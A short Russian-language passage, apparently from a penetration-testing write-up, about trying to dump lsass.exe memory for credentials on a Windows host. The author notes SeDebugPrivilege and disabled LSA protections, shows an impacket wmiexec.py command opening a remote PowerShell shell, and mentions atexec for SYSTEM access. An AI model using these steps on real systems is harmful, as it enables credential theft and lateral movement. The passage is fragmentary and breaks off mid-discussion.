...
У нас есть High Mandatory Level, SeDebugPrivilege, защиты lsass.exe не включены (RunAsPPL, LsaCfgFlags), но пытаясь сделать дамп память lsass.exe получаем 'Access is denied':
```
# wmiexec.py -k -no-pass win2.org.local -shell-type powershell
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
Еще у нас есть интересный вариант доступа atexec с правами SYSTEM:
```
